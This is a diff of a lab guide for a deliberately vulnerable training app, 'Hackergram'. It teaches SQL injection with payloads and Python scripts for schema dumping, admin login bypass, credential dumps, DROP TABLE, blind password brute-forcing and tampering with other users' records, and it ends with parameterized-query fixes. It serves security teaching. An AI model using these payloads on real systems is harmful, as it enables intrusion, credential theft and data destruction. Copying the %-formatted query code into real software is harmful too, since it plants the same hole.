@@ -1,22 +1,75 @@
 # SQL Injection
-SQL injection is a type of attack in which an attacker injects malicious SQL queries into the input fields of a web application, targeting the SQL database. In case of success, the attacker can perform unauthorized actions, such as accessing sensitive information stored in the database, altering data by inserting, updating, or deleting records, and executing administrative commands, such as shutting down the database management system (DBMS). In more advanced scenarios, SQL injection may allow attackers to retrieve files stored on the DBMS file system or even execute system-level commands. 
 
-Hackergram is vulnerable to several types of SQLi attacks. The following exercises address these vulnerabilities. Some attacks are performed using the victim-browser and others are performed through Python scripts run at the attacker.
+## Objective
 
-## Error-based SQLi
+This experiment demonstrates how Hackergram's database queries, built with Python's `%` string formatting
+instead of parameterized statements, let an attacker read the database schema, dump credentials, bypass
+authentication, tamper with other users' data, and destroy tables, using only the `/posts`, `/users`,
+`/login`, and `/settings` endpoints.
 
-Start by obtaining information on the database software and schema. First, inject an apostrophe (') in the search field of the /users or /posts endpoints. An error message will be displayed disclosing that the software is MySQL. Next, to obtain the database schema, inject the following instruction in the search filed of the /posts endpoint (it uses union-based injection):
+## Affected Hackergram functionality
+
+- `/posts`:  post search (`search` query parameter)
+- `/users`:  user search (`search` query parameter)
+- `/login`:  username/password authentication
+- `/settings`:  profile update (`username`, `name`, `bio` fields)
+
+## Prerequisites
+
+Simple/local deployment is sufficient: none of the sub-attacks below need the LLM stack or GNS3. Some
+variants use a Python script run from the attacker machine (`requests` + `beautifulsoup4`).
+
+## Initial state
+
+Run `/reset` first. Each script registers and logs in its own throwaway user (`mallory` / `eve123`), so no
+specific user needs to be logged in beforehand. The authentication-bypass sub-attack targets the `admin`
+account without knowing its password.
+
+## Vulnerable implementation
+
+In Hackergram, `views.py` reads form fields and query parameters and passes them into `models.py`. The
+weakness is consistent across every endpoint below: SQL is built with Python's `%` formatting, so user input
+becomes part of the query *text* rather than a bound value.
+
+| What you test in the lab | In `views.py` | In `models.py` |
+|--------------------------|---------------|----------------|
+| Login bypass | `user = models.login(username, password)` after reading `request.form` | `login()` |
+| Search `/posts`, union/boolean/time-based | `posts = models.get_posts(query)` | `get_posts()` |
+| Profile `UPDATE` | `models.update_user_settings(username, new_name, ...)` from `/settings` | `update_user_settings()` |
+
+The clearest example is `update_user_settings()` in `models.py`:
+
+```python
+# Updates user
+def update_user_settings(username, name, password, bio, photo):
+    query = "UPDATE Users"
+    query += " SET username='%s', password='%s', name='%s', bio='%s', photo='%s'" % (username, password, name, bio, photo)
+    query += " WHERE username = '%s'" % (username)
+
+    commit_to_database(query)
+    return User(username, password, name, bio, photo)
+```
+
+## Experiment
+
+### Error-based SQLi
+
+Obtain information on the database software and schema. First, inject an apostrophe (`'`) in the search
+field of the `/users` or `/posts` endpoints. An error message will be displayed disclosing that the software
+is MySQL. Next, to obtain the database schema, inject the following instruction in the search field of the
+`/posts` endpoint (it uses union-based injection):
 
 ```
-' UNION SELECT '1', TABLE_NAME, '1', '1', COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS -- 
+' UNION SELECT '1', TABLE_NAME, '1', '1', COLUMN_NAME, table_schema FROM INFORMATION_SCHEMA.COLUMNS --
 ```
 
-You will learn that the database has four tables (Users, Requests, Posts, and Friends), and you will also learn which are the columns of each table. To obtain a more structured output run the script of Appendix A at the attacker.
+You will learn that the database has four tables (Users, Requests, Posts, and Friends), and which columns
+each has. To obtain a more structured output, run this script at the attacker:
 
 <details>
-<summary><strong>💡 Solution</strong></summary>
-Execute this script on the attacker's machine:
-``` py
+<summary><strong>💡 Script: dump DB version and schema</strong></summary>
+
+```py
 # Gets DB version and DB schema (Search Posts)
 
 import requests
@@ -84,50 +137,38 @@ if __name__ == '__main__':
         login(s)
         exploit(s)
 ```
-</details>
-
-## Authentication bypass
-
-Hackergram is vulnerable to authentication bypass attacks. In this exercise, login as admin without using its password.
-
-<details>
-<summary><strong>💡 Solution</strong></summary>
-
-In the /login endpoint, inject 
-
-```
-admin' and 1=1 -- 
-
-```
-
-**Why it works:**
-
-The SQL query becomes: `SELECT * FROM Users WHERE username='admin' and 1=1 -- ' AND password='anything'`
-
-The `--` comments out the password check, and `1=1` is always true.
 
 </details>
 
-## Union-based SQLi
+### Authentication bypass
 
-Use union-based injection to dump all users and passwords from the database.
+Log in as `admin` without knowing its password. In the `/login` endpoint, inject:
+
+```
+admin' and 1=1 --
+```
+
+**Why it works:** the query becomes `SELECT * FROM Users WHERE username='admin' and 1=1 -- ' AND
+password='anything'`. The `--` comments out the password check, and `1=1` is always true.
+
+### Union-based SQLi
+
+Dump all users and passwords from the database.
+
+**Manual, via the `/posts` search field:**
+
+```
+' UNION SELECT '1', username, password, '1', '1', '1' FROM Users --
+```
+
+or, for better formatting:
+
+```
+' UNION SELECT '1', CONCAT(username, ':', password), '1', '1', '1', '1' FROM Users --
+```
 
 <details>
-<summary><strong>💡 Solution</strong></summary>
-
-**Method 1: Manual injection via search field**
-
-1. **In `/posts` search field, enter:**
-   ```
-   ' UNION SELECT '1', username, password, '1', '1', '1' FROM Users -- 
-   ```
-
-2. **Alternative payload for better formatting:**
-   ```
-   ' UNION SELECT '1', CONCAT(username, ':', password), '1', '1', '1', '1' FROM Users -- 
-   ```
-
-**Method 2: Python script for automated dumping**
+<summary><strong>💡 Script: automated dump</strong></summary>
 
 ```py
 import requests
@@ -137,10 +178,10 @@ import re
 def dump_users(session):
     payload = "' UNION SELECT '1', CONCAT(username, '|', password, '|', name), '1', '1', '1', '1' FROM Users -- "
     r = session.get(SERVER+"/posts", params={"search": payload})
-    
+
     # Extract user data from response
     users = re.findall(r'([^|]+)\|([^|]+)\|([^|]+)', r.text)
-    
+
     print("Dumped Users:")
     print("-" * 50)
     for username, password, name in users:
@@ -153,44 +194,29 @@ if __name__ == '__main__':
     host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
     port = '80' if len(sys.argv) < 3 else sys.argv[2]
     SERVER = "http://" + host + ":" + port
-    
+
     with requests.session() as s:
-        # Register and login first
         register(s)
         login(s)
         dump_users(s)
 ```
 
-**Expected Output:**
-- admin:admin123:Administrator
-- mr_robot:password123:Mr Robot
-- dpr:secretpass:DPR
-- etc.
-
 </details>
 
-## Piggybacked SQLi
+### Piggybacked SQLi
 
 Use piggybacked SQLi to delete one table from Hackergram's database.
 
-<details>
-<summary><strong>💡 Solution</strong></summary>
+!!! warning "This will permanently delete data!"
+    Run `/reset` afterwards. Don't drop the `Users` table, because it will break authentication, including your own.
 
-**⚠️ Warning: This will permanently delete data!**
+**Method 1: Drop table via search injection, in the `/posts` search field:**
 
-**Method 1: Drop table via search injection**
+```
+test'; DROP TABLE Friends; --
+```
 
-1. **In `/posts` search field:**
-   ```
-   test'; DROP TABLE Friends; -- 
-   ```
-
-2. **Alternative targets:**
-   ```
-   test'; DROP TABLE Requests; -- 
-   test'; DROP TABLE Posts; -- 
-   ```
-   (Don't drop Users table as it will break authentication)
+Other valid targets: `Requests`, `Posts`.
 
 **Method 2: Python script approach**
 
@@ -209,15 +235,15 @@ def verify_deletion(session, table_name):
     test_payload = f"' UNION SELECT '1', '1', '1', '1', '1', '1' FROM {table_name} -- "
     r = session.get(SERVER+"/posts", params={"search": test_payload})
     if "doesn't exist" in r.text or "Unknown table" in r.text:
-        print(f"✅ Table {table_name} successfully deleted!")
+        print(f"Table {table_name} successfully deleted!")
     else:
-        print(f"❌ Table {table_name} still exists")
+        print(f"Table {table_name} still exists")
 
 if __name__ == '__main__':
     host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
     port = '80' if len(sys.argv) < 3 else sys.argv[2]
     SERVER = "http://" + host + ":" + port
-    
+
     with requests.session() as s:
         register(s)
         login(s)
@@ -225,19 +251,18 @@ if __name__ == '__main__':
         verify_deletion(s, "Friends")
 ```
 
-**What happens:**
-The SQL query becomes: `SELECT * FROM Posts WHERE content LIKE '%test'; DROP TABLE Friends; -- %'`
-This executes two statements: the original SELECT and the DROP TABLE command.
+**What happens:** the query becomes `SELECT * FROM Posts WHERE content LIKE '%test'; DROP TABLE Friends;
+-- %'` which means two statements run back to back: the original `SELECT` and the injected `DROP TABLE`.
 
-</details>
+### Boolean-based and time-based SQLi
 
-## Boolean-based SQLi
+Brute-force the admin password character by character via the `/posts` search field, without ever seeing an
+error message or a direct dump.
 
-Hackergram is vulnerable to inference attacks such as Boolean-based SQLi. The following script uses this technique to bruteforce the password of the admin user by targeting the search field of the /posts endpoint:
+<details>
+<summary><strong>💡 Script: boolean-based</strong></summary>
 
 ```py
-# Gets DB version and DB schema (Search Posts)
-
 import requests
 import sys
 import string
@@ -293,16 +318,14 @@ if __name__ == '__main__':
         exploit(s)
 ```
 
-Run the script at the attacker and check that the attack indeed works.
+</details>
 
 !!! note "Additional exercise"
 
     Modify the script to obtain the same information using a time-based injection technique
 
 <details>
-<summary><strong>💡 Solution for Time-based SQLi</strong></summary>
-
-**Time-based SQLi Script:**
+<summary><strong>💡 Script: time-based</strong></summary>
 
 ```py
 import requests
@@ -333,7 +356,7 @@ def time_based_exploit(session):
     user = 'admin'
     password = ""
     all_chars = string.ascii_letters + string.digits + string.punctuation
-    
+
     for pos in range(1, 33):
         found = False
         for char in all_chars:
@@ -341,7 +364,7 @@ def time_based_exploit(session):
             start_time = time.time()
             r = session.get(SERVER+"/posts", params={"search": payload})
             end_time = time.time()
-            
+
             # If response took longer than 2.5 seconds, we found the character
             if (end_time - start_time) > 2.5:
                 print(f"Found character: {char}")
@@ -366,55 +389,21 @@ if __name__ == '__main__':
         time_based_exploit(s)
 ```
 
-**How it works:**
-- Uses `SLEEP(3)` function to delay response when condition is true
-- Measures response time to determine if character is correct
-- If response takes longer than 2.5 seconds, the character was found
-- More reliable than boolean-based in some scenarios
-
 </details>
 
-## Changing other user's profile
+### Changing another user's profile
 
-The following function is used to update the user profile at Hackergram:
+Given `update_user_settings()` above, inject an instruction that changes the bio field of the `dpr` user to
+`"user was pwned"`.
 
-```py
-# Updates user
-def update_user_settings(username, name, password, bio, photo):
-    query = "UPDATE Users"
-    query+= " SET username='%s', password='%s', name='%s', bio='%s', photo='%s'" % (username, password, name, bio, photo)
-    query+= " WHERE username = '%s'" % (username)
- 
-    commit_to_database(query)
-    return User(username, password, name, bio, photo)
+**In your own bio field:**
+
 ```
-
-Based on this information, inject an instruction that changes the bio field of the dpr user to "user was pwned".
+normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; --
+```
 
 <details>
-<summary><strong>💡 Solution</strong></summary>
-
-**Analysis of the vulnerable function:**
-The `update_user_settings` function uses string formatting without proper escaping, making it vulnerable to SQL injection through any of the parameters.
-
-**Method 1: Bio field injection**
-
-1. **In your bio field, enter:**
-   ```
-   normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- 
-   ```
-
-2. **This creates the SQL query:**
-   ```sql
-   UPDATE Users SET username='mallory', password='eve123', name='Mallory', bio='normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- ', photo='' WHERE username = 'mallory'
-   ```
-
-**Method 2: Name field injection**
-```
-Mallory'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- 
-```
-
-**Method 3: Python script to automate the attack**
+<summary><strong>💡 Script: automated profile attack</strong></summary>
 
 ```py
 import requests
@@ -441,7 +430,7 @@ def login(session):
 def exploit_profile(session):
     # Malicious payload in bio field
     malicious_bio = "normal bio'; UPDATE Users SET bio='user was pwned' WHERE username='dpr'; -- "
-    
+
     payload = {
         'username': 'mallory',
         'name': 'Mallory',
@@ -449,7 +438,7 @@ def exploit_profile(session):
         'bio': malicious_bio,
         'photo': ''
     }
-    
+
     r = session.post(SERVER+"/settings", data=payload)
     print("Profile update sent with malicious payload")
     return r
@@ -458,9 +447,9 @@ def verify_attack(session):
     # Check if dpr's bio was changed
     r = session.get(SERVER+"/users")
     if "user was pwned" in r.text:
-        print("✅ Attack successful! DPR's bio was changed.")
+        print("Attack successful! DPR's bio was changed.")
     else:
-        print("❌ Attack failed or bio not visible.")
+        print("Attack failed or bio not visible.")
 
 if __name__ == '__main__':
     host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
@@ -477,49 +466,40 @@ if __name__ == '__main__':
         verify_attack(s)
 ```
 
-**Why it works:**
-The vulnerable string formatting allows us to break out of the current UPDATE statement and inject our own SQL commands. The `--` comments out the rest of the original query.
-
-**Alternative payloads:**
-- Change password: `'; UPDATE Users SET password='hacked' WHERE username='dpr'; -- `
-- Change username: `'; UPDATE Users SET username='pwned_dpr' WHERE username='dpr'; -- `
-- Delete user: `'; DELETE FROM Users WHERE username='dpr'; -- `
-
 </details>
 
-## Countermeasures
+**Alternative payloads:** change password: `'; UPDATE Users SET password='hacked' WHERE username='dpr'; -- `;
+change username: `'; UPDATE Users SET username='pwned_dpr' WHERE username='dpr'; -- `; delete user: `';
+DELETE FROM Users WHERE username='dpr'; -- `.
 
-In Hackergram, `views.py` reads form fields and query parameters and passes them into `models.py`. **The weakness is building SQL with Python’s `%` formatting**: user input becomes part of the query *text*. The fix is to keep the SQL shape fixed and pass values as **bound parameters** in `cursor.execute(sql, tuple)`.
+## Expected result
 
-The examples below mirror the real Hackergram layout: **routes in `views.py`**, **queries in `models.py`** (plus one `DELETE` built in `views.py`).
+- Error-based: a MySQL error banner appears, followed by a listing of `(table : column)` pairs for the
+  `hackergramdb` schema.
+- Auth bypass: you land on the `admin` dashboard/home page without ever supplying the real password.
+- Union-based: the posts feed shows fabricated "posts" whose content is actually `username:password` pairs.
+- Piggybacked: a subsequent query against the dropped table returns a "doesn't exist"/"Unknown table" error.
+- Boolean/time-based: the script prints a full recovered password for `admin`, one character at a time.
+- Profile injection: `dpr`'s bio, visible from `/users`, reads `user was pwned`.
 
-### How requests reach the database (`views.py`)
+## Why it works
 
-These call sites feed untrusted data into functions that currently format SQL strings:
+Every query above is built with `%` string formatting instead of parameterized queries, so anything the
+attacker puts in `search`, `username`, `login`, or `bio` becomes part of the SQL statement itself rather than
+a literal value. `--` comments out the rest of the original query, and `UNION SELECT` lets an attacker splice
+arbitrary rows into a result set the template already knows how to render.
 
-| What you test in the lab | In `views.py` | In `models.py` |
-|--------------------------|---------------|----------------|
-| Login bypass | `user = models.login(username, password)` after reading `request.form` | `login()` |
-| Search `/posts`, union/boolean/time-based | `posts = models.get_posts(query)` | `get_posts()` |
-| Profile `UPDATE` | `models.update_user_settings(username, new_name, ...)` from `/settings` | `update_user_settings()` |
-| (Optional) Admin delete user | `"DELETE FROM Users WHERE username = '%s'" % user_to_delete` then `commit_to_database` | N/A — fix this line in `views.py` |
+## Reset / cleanup
 
-You usually **do not** need to change how the route reads `request.form`; you change how `models.py` (and that admin `DELETE`) executes SQL.
+Run `/reset` to restore the database, especially after the piggybacked (`DROP TABLE`) and profile-tampering
+sub-attacks.
 
-### Fix `login` (stops authentication bypass)
+## Inspect and modify
 
-**Today in `models.py` (vulnerable):** quotes in `username` / `password` break out of the string.
+The fix is to keep the SQL shape fixed and pass values as bound parameters in `cursor.execute(sql, tuple)`
+instead of formatting them into the query string.
 
-```python
-def login(username, password):
-    query = "SELECT * FROM Users"
-    query += " WHERE username = '%s'" % (username)
-    query += " AND password = '%s'" % (password)
-    data = get_from_database(query)
-    ...
-```
-
-**Safer:** placeholders `%s` for the values only.
+**Fix `login()` in `models.py`** (stops authentication bypass):
 
 ```python
 def login(username, password):
@@ -536,19 +516,7 @@ def login(username, password):
 
 Payloads like `admin' AND 1=1 -- ` are then treated as the **literal** username, not SQL syntax.
 
-### Fix `get_posts` (stops search / `UNION` / inference tricks on `/posts`)
-
-**Today in `models.py` (vulnerable):** the search term is embedded inside `LIKE '%%%s%%'`.
-
-```python
-def get_posts(search):
-    query = "SELECT Posts.id, Users.username, ..."
-    query += " WHERE Posts.content LIKE '%%%s%%'" % (search)
-    data = get_from_database(query)
-    ...
-```
-
-**Safer:** build the `%...%` pattern in Python; bind it as **one** value.
+**Fix `get_posts()` in `models.py`** (stops search / `UNION` / inference tricks on `/posts`):
 
 ```python
 def get_posts(search):
@@ -568,20 +536,7 @@ def get_posts(search):
 
 Apply the same pattern anywhere else you see `LIKE '%%%s%%'` (for example `get_users`, `get_friends`).
 
-### Fix `update_user_settings` (stops piggybacked `UPDATE` in profile fields)
-
-**Today in `models.py` (vulnerable):** all fields are pasted into the statement, including `bio`.
-
-```python
-def update_user_settings(username, name, password, bio, photo):
-    query = "UPDATE Users"
-    query += " SET username='%s', password='%s', name='%s', bio='%s', photo='%s'" % (
-        username, password, name, bio, photo)
-    query += " WHERE username = '%s'" % (username)
-    commit_to_database(query)
-```
-
-**Safer:**
+**Fix `update_user_settings()` in `models.py`** (stops piggybacked `UPDATE` in profile fields):
 
 ```python
 def update_user_settings(username, name, password, bio, photo):
@@ -595,27 +550,24 @@ def update_user_settings(username, name, password, bio, photo):
     con.close()
 ```
 
-### Fix admin delete user (`views.py`)
+Apply the same fix to it, repeat the attacks above, and confirm every payload now fails.
 
-**Today (vulnerable fragment):**
+Two more things worth doing while you're in there: give the app's DB account only the rights it needs (no
+`DROP` / file read), so a missed piggybacked statement does less damage; and stop the `error()` helper in
+`views.py` from echoing exception text to the browser. Log details server-side and show users a generic
+message instead (this is what makes error-based SQLi so easy in the first place).
 
-```python
-query = "DELETE FROM Users WHERE username = '%s'" % user_to_delete
-models.commit_to_database(query)
-```
+## Exercise
 
-**Safer:** parameterized delete (example — use the same `mysql` handle your app already uses):
+Using `update_user_settings()`, find at least one other field (besides `bio`) that can be used to inject
+SQL, and use it to change a different user's password.
 
-```python
-con = mysql.connection.cursor()
-con.execute("DELETE FROM Users WHERE username = %s", (user_to_delete,))
-mysql.connection.commit()
-con.close()
-```
+## Hint
 
-### Still use least privilege and safer errors
+<details>
+<summary>💡 Hint</summary>
 
-- Give the app DB account only the rights it needs (no `DROP` / file read), so piggybacked statements have less impact if something is missed.
-- The `error()` helper in `views.py` can expose exception text to the browser, which helps **error-based** SQLi. Log details on the server; show users a **generic** message.
+The `name` field goes through the same unparameterized `UPDATE` statement as `bio`, so a payload of the form
+`Mallory'; UPDATE Users SET password='hacked' WHERE username='dpr'; --` works the same way.
 
-**Takeaway:** parameterized `execute(sql, params)` in `models.py` (and for the admin `DELETE` in `views.py`) matches how Hackergram is structured and closes the same holes you exploit in the exercises.
+</details>
